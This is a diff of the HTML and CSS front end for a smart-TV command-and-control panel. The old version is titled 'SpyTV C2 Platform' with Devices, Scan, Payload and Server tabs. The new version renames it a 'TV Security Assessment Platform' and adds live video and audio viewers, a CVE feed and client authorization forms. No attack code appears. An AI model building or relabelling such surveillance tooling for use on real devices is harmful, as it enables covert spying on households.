@@ -1,633 +1,2701 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Authenticated, Inc. — SpyTV C2 Platform</title>
-    <style>
-        :root {
-            --bg: #0B0E14;
-            --bg-secondary: #111827;
-            --surface: #151B27;
-            --surface-hover: #1A2235;
-            --border: #1F2937;
-            --border-light: #374151;
-            --text: #F3F4F6;
-            --text-secondary: #9CA3AF;
-            --text-muted: #8B93A1;
-            --accent: #3B82F6;
-            --accent-hover: #2563EB;
-            --success: #10B981;
-            --success-light: rgba(16, 185, 129, 0.1);
-            --danger: #EF4444;
-            --danger-light: rgba(239, 68, 68, 0.1);
-            --warning: #F59E0B;
-            --warning-light: rgba(245, 158, 11, 0.1);
-            --radius: 12px;
-            --radius-sm: 8px;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            min-height: 100vh;
-            line-height: 1.5;
-        }
-        .header {
-            background: var(--surface);
-            border-bottom: 1px solid var(--border);
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 16px;
-            position: sticky;
-            top: 0;
-            z-index: 50;
-        }
-        .header-title h1 { font-size: 18px; font-weight: 700; }
-        .header-title p { font-size: 12px; color: var(--text-muted); }
-        .nav {
-            background: var(--surface);
-            border-bottom: 1px solid var(--border);
-            padding: 0 20px;
-            display: flex;
-            gap: 4px;
-            overflow-x: auto;
-        }
-        .nav-item {
-            padding: 12px 20px;
-            font-size: 13px;
-            font-weight: 500;
-            color: var(--text-secondary);
-            cursor: pointer;
-            border-bottom: 2px solid transparent;
-            transition: all 0.15s;
-            white-space: nowrap;
-        }
-        .nav-item:hover { color: var(--text); }
-        .nav-item.active { color: var(--accent); border-bottom-color: var(--accent); }
-        .main { padding: 20px; max-width: 1200px; margin: 0 auto; }
-        .card {
-            background: var(--surface);
-            border: 1px solid var(--border);
-            border-radius: var(--radius);
-            overflow: hidden;
-        }
-        .card-header {
-            padding: 16px 20px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .card-title { font-size: 14px; font-weight: 600; }
-        .card-body { padding: 20px; }
-        .btn {
-            padding: 8px 14px;
-            border: 1px solid var(--border);
-            border-radius: var(--radius-sm);
-            background: var(--surface);
-            color: var(--text);
-            font-size: 12px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.15s;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            white-space: nowrap;
-        }
-        .btn:hover { background: var(--surface-hover); border-color: var(--border-light); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .btn-primary { background: #2563EB; border-color: #2563EB; color: white; }
-        .btn-primary:hover { background: #1D4ED8; border-color: #1D4ED8; }
-        .btn-success { background: #047857; border-color: #047857; color: white; }
-        .btn-success:hover { background: #065F46; border-color: #065F46; }
-        .btn-danger { background: #DC2626; border-color: #DC2626; color: white; }
-        .btn-danger:hover { background: #B91C1C; border-color: #B91C1C; }
-        .form-group { margin-bottom: 16px; }
-        .form-label {
-            display: block;
-            font-size: 12px;
-            font-weight: 500;
-            color: var(--text-secondary);
-            margin-bottom: 6px;
-        }
-        .form-input, .form-select {
-            width: 100%;
-            padding: 10px 14px;
-            border: 1px solid var(--border);
-            border-radius: var(--radius-sm);
-            background: var(--bg);
-            color: var(--text);
-            font-size: 13px;
-        }
-        .form-input:focus { outline: none; border-color: var(--accent); }
-        .form-select { cursor: pointer; }
-        .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
-        .form-row .form-group { flex: 1; min-width: 150px; }
-        .stat { text-align: center; }
-        .stat-value { font-size: 24px; font-weight: 700; color: var(--text); }
-        .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
-        .stats-row { display: flex; gap: 30px; justify-content: center; flex-wrap: wrap; }
-        .log-container {
-            background: var(--bg);
-            border-radius: var(--radius-sm);
-            padding: 12px;
-            font-family: 'SF Mono', 'Consolas', monospace;
-            font-size: 12px;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        .log-entry { padding: 2px 0; color: var(--text-secondary); }
-        .log-entry .time { color: var(--text-muted); }
-        .alert {
-            padding: 12px 16px;
-            border-radius: var(--radius-sm);
-            font-size: 13px;
-            margin-bottom: 16px;
-        }
-        .alert-info { background: var(--accent-light); color: var(--accent); }
-        .alert-success { background: var(--success-light); color: var(--success); }
-        .alert-warning { background: var(--warning-light); color: var(--warning); }
-        .loading { text-align: center; padding: 40px; color: var(--text-muted); }
-        .footer {
-            text-align: center;
-            padding: 24px;
-            border-top: 1px solid var(--border);
-            margin-top: 40px;
-        }
-        .footer p { font-size: 12px; color: var(--text-muted); }
-        @media (max-width: 768px) {
-            .header-title h1 { font-size: 16px; }
-            .card-header { padding: 12px 16px; }
-            .card-body { padding: 16px; }
-            .main { padding: 16px; }
-            .form-row { flex-direction: column; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Authenticated, Inc. — TV Security Assessment Platform</title>
+<style>
+  :root {
+    --bg: #0B0E14;
+    --bg-secondary: #111827;
+    --surface: #151B27;
+    --surface-hover: #1A2235;
+    --border: #1F2937;
+    --border-light: #374151;
+    --text: #F3F4F6;
+    --text-secondary: #9CA3AF;
+    --text-muted: #8B93A1;
+    --accent: #3B82F6;
+    --accent-hover: #2563EB;
+    --accent-light: rgba(59, 130, 246, 0.1);
+    --success: #10B981;
+    --success-light: rgba(16, 185, 129, 0.1);
+    --danger: #EF4444;
+    --danger-light: rgba(239, 68, 68, 0.1);
+    --warning: #F59E0B;
+    --warning-light: rgba(245, 158, 11, 0.1);
+    --radius: 12px;
+    --radius-sm: 8px;
+    --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.3);
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    line-height: 1.5;
+  }
+
+  /* Header */
+  .header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 16px 32px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    flex-wrap: wrap;
+  }
+  .header-logo { width: 40px; height: 40px; border-radius: var(--radius-sm); }
+  .header-title h1 { font-size: 18px; font-weight: 700; letter-spacing: -0.025em; }
+  .header-title p { font-size: 12px; color: var(--text-muted); }
+  .header-nav {
+    margin-left: auto;
+    display: flex;
+    gap: 8px;
+    align-items: center;
+  }
+  .header-nav a {
+    font-size: 12px;
+    color: var(--text-secondary);
+    text-decoration: none;
+    padding: 6px 12px;
+    border-radius: var(--radius-sm);
+    transition: all 0.15s;
+  }
+  .header-nav a:hover { color: var(--text); background: var(--surface-hover); }
+  .header-stats {
+    display: flex;
+    gap: 24px;
+  }
+  .stat { text-align: right; }
+  .stat-value { font-size: 20px; font-weight: 700; color: var(--text); }
+  .stat-label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; }
+
+  /* Navigation */
+  .nav {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 0 32px;
+    display: flex;
+    gap: 4px;
+    overflow-x: auto;
+  }
+  .nav-item {
+    padding: 12px 20px;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  .nav-item:hover { color: var(--text); }
+  .nav-item.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+  /* Main Content */
+  .main { padding: 32px; max-width: 1600px; margin: 0 auto; }
+  /* T-01: main card and right column are equal width. */
+  .main-layout { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 20px; align-items: start; }
+  .right-column { display: flex; flex-direction: column; gap: 20px; min-width: 0; }
+  /* Output panel — single replaceable viewer for whitepaper / vuln info. */
+  #output-panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: flex;
+    flex-direction: column;
+    max-height: min(62vh, 620px);
+    overflow: hidden;
+  }
+  #output-panel .card-header {
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 8px; flex-shrink: 0;
+  }
+  #output-body { overflow-y: auto; padding: 16px; font-size: 13px; line-height: 1.55; }
+  #output-body .output-empty { color: var(--text-muted); font-size: 12px; }
+  #output-body .output-title { font-size: 16px; font-weight: 700; margin: 0 0 4px; }
+  #output-body .output-meta { color: var(--text-muted); font-size: 11px; margin-bottom: 12px; }
+  #output-body .output-meta a { color: var(--accent); }
+  #output-body h1 { font-size: 17px; margin: 0 0 8px; }
+  #output-body h2 { font-size: 13px; margin: 18px 0 6px; color: var(--text-secondary);
+    text-transform: uppercase; letter-spacing: .05em; }
+  #output-body h3 { font-size: 13px; margin: 14px 0 4px; }
+  #output-body p { margin: 0 0 10px; color: var(--text-secondary); }
+  #output-body ul { margin: 0 0 10px; padding-left: 18px; color: var(--text-secondary); }
+  #output-body li { margin-bottom: 4px; }
+  #output-body pre { background: var(--bg); border: 1px solid var(--border);
+    border-radius: 6px; padding: 10px; overflow-x: auto; font-size: 11px; }
+  #output-body code { color: var(--accent); font-family: 'SF Mono', 'Consolas', monospace; font-size: 12px; }
+  #output-body pre code { color: var(--text-secondary); }
+  #output-body a { color: var(--accent); }
+  #output-body table { width: 100%; border-collapse: collapse; font-size: 12px; margin-bottom: 10px; }
+  #output-body th, #output-body td { text-align: left; padding: 6px 8px;
+    border-bottom: 1px solid var(--border); vertical-align: top; }
+  #output-body th { color: var(--text-muted); font-weight: 600; }
+  .feed-panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    position: sticky;
+    top: 96px;
+    max-height: calc(100vh - 130px);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+  .feed-panel .card-header { flex-shrink: 0; }
+  .feed-list { overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 10px; }
+  .feed-item {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 10px 12px;
+    font-size: 12px;
+  }
+  .feed-item:hover { border-color: var(--border-light); }
+  .feed-item-head { display: flex; align-items: center; justify-content: space-between; gap: 8px; margin-bottom: 6px; }
+  .feed-item-id { font-family: 'SF Mono', 'Consolas', monospace; font-weight: 600; color: var(--accent); text-decoration: none; }
+  .feed-item-id:hover { text-decoration: underline; }
+  .feed-item-desc { color: var(--text-secondary); line-height: 1.45; margin-bottom: 8px;
+    display: -webkit-box; -webkit-line-clamp: 4; -webkit-box-orient: vertical; overflow: hidden; }
+  .feed-item-links { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
+  .feed-item-links a { font-size: 11px; color: var(--accent); text-decoration: none; }
+  .feed-item-links a:hover { text-decoration: underline; }
+  .feed-item-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
+  .feed-item-actions .btn { font-size: 10.5px; padding: 4px 9px; }
+  .feed-meta { padding: 8px 12px; border-top: 1px solid var(--border); font-size: 11px;
+    color: var(--text-muted); display: flex; justify-content: space-between; gap: 8px; flex-wrap: wrap; flex-shrink: 0; }
+  .cve-chips { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 10px; }
+  .cve-chip {
+    font-family: 'SF Mono', 'Consolas', monospace; font-size: 10px;
+    background: var(--accent-light); color: var(--accent);
+    border: 1px solid rgba(59,130,246,.35); border-radius: 10px; padding: 2px 8px;
+  }
+  .cve-chip.critical { background: var(--danger-light); color: var(--danger); border-color: rgba(239,68,68,.4); }
+  .cve-chip.high { background: var(--warning-light); color: var(--warning); border-color: rgba(245,158,11,.4); }
+  @media (max-width: 1280px) {
+    .main-layout { grid-template-columns: 1fr; }
+    .feed-panel { position: static; max-height: 420px; }
+  }
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* Cards */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+  }
+  .card-header {
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .card-title { font-size: 14px; font-weight: 600; }
+  .card-body { padding: 20px; }
+
+  /* Help Icon */
+  .help-icon {
+    width: 20px; height: 20px;
+    border-radius: 50%;
+    background: var(--border);
+    color: var(--text-muted);
+    font-size: 11px;
+    font-weight: 700;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    cursor: help;
+    position: relative;
+    transition: all 0.15s;
+  }
+  .help-icon:hover { background: var(--accent); color: white; }
+  .help-icon .tooltip {
+    display: none;
+    position: absolute;
+    top: 28px;
+    right: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 12px 16px;
+    font-size: 12px;
+    font-weight: 400;
+    color: var(--text-secondary);
+    width: 280px;
+    z-index: 100;
+    box-shadow: var(--shadow);
+    text-align: left;
+    line-height: 1.5;
+  }
+  .help-icon:hover .tooltip { display: block; }
+
+  /* Tooltip */
+  [data-tooltip] { position: relative; cursor: help; }
+  [data-tooltip]:hover::after {
+    content: attr(data-tooltip);
+    position: absolute;
+    bottom: 100%;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 6px 10px;
+    font-size: 11px;
+    color: var(--text-secondary);
+    white-space: nowrap;
+    z-index: 100;
+    margin-bottom: 6px;
+    pointer-events: none;
+  }
+
+  /* Device Grid */
+  .device-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+    gap: 20px;
+  }
+  .device-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    transition: all 0.2s;
+  }
+  .device-card:hover { border-color: var(--border-light); box-shadow: var(--shadow); }
+  .device-card.offline { opacity: 0.6; }
+
+  .device-header {
+    padding: 16px 20px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .device-icon {
+    width: 40px; height: 40px;
+    background: var(--accent-light);
+    border-radius: var(--radius-sm);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+  }
+  .device-info { flex: 1; min-width: 0; }
+  .device-ip { font-size: 14px; font-weight: 600; font-family: 'SF Mono', 'Consolas', monospace; }
+  .device-meta { font-size: 12px; color: var(--text-muted); }
+  .device-status {
+    padding: 4px 10px;
+    border-radius: 20px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.025em;
+  }
+  .device-status.online { background: var(--success-light); color: var(--success); }
+  .device-status.offline { background: var(--danger-light); color: var(--danger); }
+
+  .device-body { padding: 16px 20px; }
+
+  /* Video Grid */
+  .video-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 8px;
+    margin-bottom: 16px;
+  }
+  .video-thumb {
+    aspect-ratio: 16/9;
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 11px;
+    color: var(--text-muted);
+    overflow: hidden;
+    position: relative;
+    border: 1px solid var(--border);
+  }
+  .video-thumb img { width: 100%; height: 100%; object-fit: cover; }
+  .video-thumb .live-badge {
+    position: absolute;
+    top: 6px; left: 6px;
+    background: var(--danger);
+    color: white;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-size: 9px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+  }
+
+  /* Audio Player */
+  .audio-player {
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    padding: 12px;
+    margin-bottom: 16px;
+  }
+  .audio-player .label {
+    font-size: 11px;
+    color: var(--text-muted);
+    margin-bottom: 8px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+  .audio-player audio { width: 100%; height: 32px; }
+
+  /* Controls */
+  .controls { display: flex; flex-wrap: wrap; gap: 8px; }
+  .btn {
+    padding: 8px 14px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    background: var(--surface);
+    color: var(--text);
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.15s;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    white-space: nowrap;
+  }
+  .btn:hover { background: var(--surface-hover); border-color: var(--border-light); }
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  /* AA-contrast variants (white/dark text verified against backgrounds) */
+  .btn-primary { background: #2563EB; border-color: #2563EB; color: white; }
+  .btn-primary:hover { background: #1D4ED8; border-color: #1D4ED8; }
+  .btn-success { background: #047857; border-color: #047857; color: white; }
+  .btn-success:hover { background: #065F46; border-color: #065F46; }
+  .btn-danger { background: #DC2626; border-color: #DC2626; color: white; }
+  .btn-danger:hover { background: #B91C1C; border-color: #B91C1C; }
+  .btn-warning { background: var(--warning); border-color: var(--warning); color: #111827; }
+  .btn-warning:hover { background: #D97706; border-color: #D97706; color: #111827; }
+  .btn-outline { background: transparent; }
+  .btn-sm { padding: 6px 10px; font-size: 11px; }
+
+  /* Duration Selector */
+  .duration-select {
+    display: flex;
+    gap: 4px;
+    margin-top: 12px;
+    padding-top: 12px;
+    border-top: 1px solid var(--border);
+    flex-wrap: wrap;
+  }
+  .duration-label { font-size: 11px; color: var(--text-muted); margin-right: 8px; align-self: center; }
+  .duration-btn {
+    padding: 4px 10px;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    background: transparent;
+    color: var(--text-secondary);
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .duration-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .duration-btn.active { background: var(--accent); border-color: var(--accent); color: white; }
+
+  /* Forms */
+  .form-group { margin-bottom: 16px; }
+  .form-label {
+    display: block;
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    margin-bottom: 6px;
+  }
+  .form-input {
+    width: 100%;
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    background: var(--bg);
+    color: var(--text);
+    font-size: 13px;
+    transition: border-color 0.15s;
+  }
+  .form-input:focus { outline: none; border-color: var(--accent); }
+  .form-select {
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    background: var(--bg);
+    color: var(--text);
+    font-size: 13px;
+    cursor: pointer;
+  }
+  .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
+  .form-row .form-group { flex: 1; min-width: 200px; }
+
+  /* Table */
+  .table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  .table th {
+    text-align: left;
+    padding: 12px 16px;
+    font-size: 11px;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    border-bottom: 1px solid var(--border);
+  }
+  .table td { padding: 12px 16px; border-bottom: 1px solid var(--border); }
+  .table tr:hover td { background: var(--surface-hover); }
+  .table .mono { font-family: 'SF Mono', 'Consolas', monospace; font-size: 12px; }
+
+  /* Status Badges */
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 3px 8px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 500;
+  }
+  .badge-success { background: var(--success-light); color: var(--success); }
+  .badge-danger { background: var(--danger-light); color: var(--danger); }
+  .badge-warning { background: var(--warning-light); color: var(--warning); }
+  /* "Ports open, nothing proven": deliberately neither green (safe) nor amber
+     (vulnerable) — the scan found a host but matched no family and no CVE. */
+  .badge-muted { background: var(--bg); color: var(--text-muted); border: 1px solid var(--border); }
+
+  /* Log */
+  .log-container {
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    padding: 12px 16px;
+    font-family: 'SF Mono', 'Consolas', monospace;
+    font-size: 12px;
+    max-height: 120px;
+    overflow-y: auto;
+  }
+  .log-entry { padding: 2px 0; color: var(--text-secondary); }
+  .log-entry .time { color: var(--text-muted); }
+
+  /* Modal */
+  .modal-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.7);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+    backdrop-filter: blur(4px);
+  }
+  .modal-overlay.active { display: flex; }
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    max-width: 600px;
+    width: 90%;
+    max-height: 85vh;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+  }
+  .modal-header { padding: 20px 24px; border-bottom: 1px solid var(--border); }
+  .modal-title { font-size: 16px; font-weight: 600; }
+  .modal-body { padding: 24px; overflow-y: auto; flex: 1; }
+  .modal-footer {
+    padding: 16px 24px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+  }
+
+  /* Code Block */
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 16px;
+    font-family: 'SF Mono', 'Consolas', monospace;
+    font-size: 12px;
+    line-height: 1.6;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  /* Empty State */
+  .empty-state { text-align: center; padding: 80px 20px; }
+  .empty-state-icon { font-size: 48px; margin-bottom: 16px; opacity: 0.5; }
+  .empty-state h3 { font-size: 16px; font-weight: 600; margin-bottom: 8px; }
+  .empty-state p { font-size: 13px; color: var(--text-muted); }
+
+  /* Alert */
+  .alert {
+    padding: 12px 16px;
+    border-radius: var(--radius-sm);
+    font-size: 13px;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .alert-info { background: var(--accent-light); color: var(--accent); }
+  .alert-success { background: var(--success-light); color: var(--success); }
+  .alert-warning { background: var(--warning-light); color: var(--warning); }
+
+  /* Server Info Grid */
+  .server-info {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 16px;
+  }
+  .info-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 16px;
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    border: 1px solid var(--border);
+  }
+  .info-item .label { font-size: 12px; color: var(--text-muted); }
+  .info-item .value { font-size: 13px; font-weight: 500; font-family: 'SF Mono', 'Consolas', monospace; }
+
+  /* Network Map */
+  .network-map {
+    background: var(--bg);
+    border-radius: var(--radius-sm);
+    padding: 20px;
+    min-height: 300px;
+    position: relative;
+    border: 1px solid var(--border);
+  }
+  .network-map svg { width: 100%; height: auto; }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    padding: 24px;
+    border-top: 1px solid var(--border);
+    margin-top: 40px;
+  }
+  .footer p { font-size: 12px; color: var(--text-muted); }
+  .footer a { color: var(--text-secondary); text-decoration: none; }
+  .footer a:hover { color: var(--accent); }
+
+  /* Engagement status banner (Audit / Patch-all) */
+  .engagement-banner {
+    display: none;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 32px;
+    gap: 16px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .engagement-banner:not([hidden]) { display: flex; }
+  .engagement-banner[hidden] { display: none !important; }
+  .eng-dot {
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--accent); flex-shrink: 0;
+    animation: eng-pulse 1.4s ease-in-out infinite;
+  }
+  .eng-dot.ok { background: var(--success); animation: none; }
+  .eng-dot.err { background: var(--danger); animation: none; }
+  .eng-dot.warn { background: var(--warning); animation: none; }
+  @keyframes eng-pulse { 0%, 100% { opacity: 0.35; } 50% { opacity: 1; } }
+  .eng-text { display: flex; flex-direction: column; min-width: 160px; flex: 1 1 220px; }
+  .eng-text strong {
+    font-size: 11px; text-transform: uppercase; letter-spacing: 0.06em;
+    color: var(--text-secondary);
+  }
+  .eng-text span {
+    font-size: 13px; color: var(--text);
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+  }
+  .eng-track {
+    flex: 1 1 180px; height: 8px; background: var(--bg);
+    border: 1px solid var(--border); border-radius: 99px; overflow: hidden;
+  }
+  .eng-bar { height: 100%; width: 0%; background: var(--accent); border-radius: 99px; transition: width 0.4s ease; }
+  .eng-bar.ok { background: var(--success); }
+  .eng-bar.err { background: var(--danger); }
+  .eng-pct { font-size: 12px; font-family: 'SF Mono', 'Consolas', monospace; color: var(--text-secondary); min-width: 38px; text-align: right; }
+  .eng-actions { display: flex; gap: 8px; flex-wrap: wrap; margin-left: auto; }
+
+  /* Tables: horizontal scroll wrapper for narrow viewports */
+  .table-scroll { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+
+  /* Modal refinements */
+  .modal-lg { max-width: 720px; }
+  .modal-xl { max-width: 1100px; width: 94vw; }
+  .modal-sub { font-size: 12px; color: var(--text-muted); margin-top: 4px; }
+
+  /* Client details form (2-col grid → 1-col on small screens) */
+  .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0 16px; }
+  .form-grid .span-2 { grid-column: 1 / -1; }
+
+  /* Authorization: document preview + signature pad */
+  .auth-grid { display: grid; grid-template-columns: minmax(0, 1.4fr) minmax(270px, 1fr); gap: 20px; }
+  .auth-doc iframe {
+    width: 100%; height: 520px; border: 1px solid var(--border);
+    border-radius: var(--radius-sm); background: #fff;
+  }
+  .sig-wrap {
+    background: var(--bg); border: 1px dashed var(--border-light);
+    border-radius: var(--radius-sm); overflow: hidden;
+  }
+  #sig-canvas { display: block; width: 100%; height: 140px; touch-action: none; cursor: crosshair; }
+  .sig-hint { font-size: 11px; color: var(--text-muted); margin-top: 6px; }
+  .sig-name { font-size: 13px; font-weight: 600; padding: 8px 0; }
+  .auth-note {
+    font-size: 11px; color: var(--text-muted); line-height: 1.55;
+    border-top: 1px solid var(--border); padding-top: 10px; margin-top: 4px;
+  }
+
+  /* Inline check result (Scan → Check) */
+  .check-result {
+    background: var(--bg); border: 1px solid var(--border);
+    border-radius: var(--radius-sm); padding: 14px 16px; margin-top: 16px;
+    font-size: 13px;
+  }
+  .check-result h4 { font-size: 13px; margin-bottom: 8px; }
+  .check-rows { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 8px; }
+  .check-rows .info-item { padding: 8px 12px; }
+
+  /* Accessibility */
+  :where(a, button, input, select, textarea, canvas[tabindex], [tabindex]):focus-visible {
+    outline: 2px solid var(--accent);
+    outline-offset: 2px;
+  }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+      transition-duration: 0.01ms !important;
+      animation-duration: 0.01ms !important;
+    }
+  }
+  @media (pointer: coarse) {
+    .btn { min-height: 44px; padding: 10px 16px; }
+    .nav-item { min-height: 44px; display: inline-flex; align-items: center; }
+    .duration-btn { min-height: 40px; }
+    .help-icon { width: 24px; height: 24px; }
+  }
+
+  /* Responsive */
+  @media (max-width: 1024px) {
+    .device-grid { grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); }
+    .header-stats { display: none; }
+  }
+  @media (max-width: 768px) {
+    .header { padding: 12px 16px; }
+    .header-nav { width: 100%; justify-content: flex-start; }
+    .main { padding: 16px; }
+    .device-grid { grid-template-columns: 1fr; }
+    .form-row { flex-direction: column; }
+    .controls { flex-wrap: wrap; }
+    .controls .btn { flex: 1 1 auto; justify-content: center; }
+    .video-grid { grid-template-columns: repeat(2, 1fr); }
+    .engagement-banner { padding: 10px 16px; }
+    .eng-actions { margin-left: 0; width: 100%; }
+    .eng-actions .btn { flex: 1 1 auto; justify-content: center; }
+    .form-grid { grid-template-columns: 1fr; }
+    .auth-grid { grid-template-columns: 1fr; }
+    .auth-doc iframe { height: 46vh; }
+    .feed-panel { max-height: 360px; }
+  }
+  @media (max-width: 480px) {
+    .header-title h1 { font-size: 16px; }
+    .nav-item { padding: 10px 12px; font-size: 12px; }
+    .device-header { flex-wrap: wrap; }
+    .video-grid { grid-template-columns: 1fr; }
+    .modal { width: 96vw; max-height: 92vh; }
+    .modal-header, .modal-body, .modal-footer { padding: 16px; }
+    .modal-footer { flex-wrap: wrap; }
+    .modal-footer .btn { flex: 1 1 auto; justify-content: center; }
+    .empty-state { padding: 48px 12px; }
+    .table th, .table td { padding: 10px 12px; }
+  }
+</style>
 </head>
 <body>
-    <header class="header">
-        <div class="header-title">
-            <h1>SpyTV C2 Platform</h1>
-            <p>Standalone Mode — Android</p>
-        </div>
-    </header>
-    
-    <nav class="nav">
-        <div class="nav-item active" onclick="switchTab('devices')">Devices</div>
-        <div class="nav-item" onclick="switchTab('scan')">Scan</div>
-        <div class="nav-item" onclick="switchTab('payload')">Payload</div>
-        <div class="nav-item" onclick="switchTab('server')">Server</div>
-    </nav>
-    
-    <main class="main">
-        <div class="main-content">
-            <!-- Server Status Banner -->
-            <div class="card" id="server-banner" style="margin-bottom: 20px;">
-                <div class="card-header">
-                    <span class="card-title">C2 Server Status</span>
-                </div>
-                <div class="card-body">
-                    <div class="stats-row">
-                        <div class="stat">
-                            <div class="stat-value" id="stat-status">✓ Running</div>
-                            <div class="stat-label">Status</div>
-                        </div>
-                        <div class="stat">
-                            <div class="stat-value" id="stat-port">8443</div>
-                            <div class="stat-label">Port</div>
-                        </div>
-                        <div class="stat">
-                            <div class="stat-value" id="stat-devices">0</div>
-                            <div class="stat-label">Devices</div>
-                        </div>
-                        <div class="stat">
-                            <div class="stat-value" id="stat-cves">0</div>
